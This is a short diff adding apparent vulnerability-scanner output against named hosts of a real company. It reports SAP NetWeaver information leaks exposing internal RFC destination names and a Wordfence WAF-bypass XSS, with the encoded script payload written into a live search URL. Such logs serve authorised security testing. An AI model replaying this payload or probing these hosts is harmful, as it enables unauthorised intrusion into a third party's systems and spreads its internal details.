@@ -1,0 +1,3 @@
+[sap-netweaver-info-leak] [http] [medium] https://eutc2cssvip-13-16-33-192.epn.uksouthgw.xerox.com/sap/public/info ["<RFCDEST>vnrpci_NRP_25</RFCDEST>"]
+[sap-netweaver-info-leak] [http] [medium] https://eutc2cssvip-13-16-33-191.epn.uksouthgw.xerox.com/sap/public/info ["<RFCDEST>vnpsdi14_NPS_14</RFCDEST>"]
+[wordpress-wordfence-waf-bypass-xss] [http] [medium] https://es-be-rc.origin.xerox.com/?s=ax6zt%2522%253e%253cscript%253ealert%2528document.domain%2529%253c%252fscript%253ey6uu6
